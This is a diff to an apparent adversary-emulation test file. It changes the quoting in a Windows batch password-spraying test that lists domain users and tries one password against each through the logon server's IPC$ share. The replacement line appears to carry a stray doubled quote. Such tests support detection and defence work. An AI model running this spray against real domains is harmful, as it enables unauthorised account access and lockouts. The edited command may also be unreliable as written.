@@ -22,5 +22,5 @@ atomic_tests:
     command: |
       rm %temp%\users.txt
       rem This builds a username list but it doesn't handle user names with spaces correctly
-      @FOR /F "Tokens=1-3 skip=6 USEBACKQ" %a in (`net users /domain ^| findstr /vc:"The command c"`) do @echo %a>>%temp%\users.txt & @echo %b>>%temp%\users.txt & echo %c>>%temp%\users.txt
+      @FOR /F "Tokens=1-3 skip=6" %a in ('net users /domain ^| findstr /vc:"The command c"'') do @echo %a>>%temp%\users.txt & @echo %b>>%temp%\users.txt & echo %c>>%temp%\users.txt
       @FOR /F %n in (%temp%\users.txt) do @net use %logonserver%\IPC$ /user:%userdomain%\%n #{password} 1>NUL 2>&1 & @echo|set/p=.  && @echo [*] %n && @net use /delete %logonserver%\IPC$ > NUL
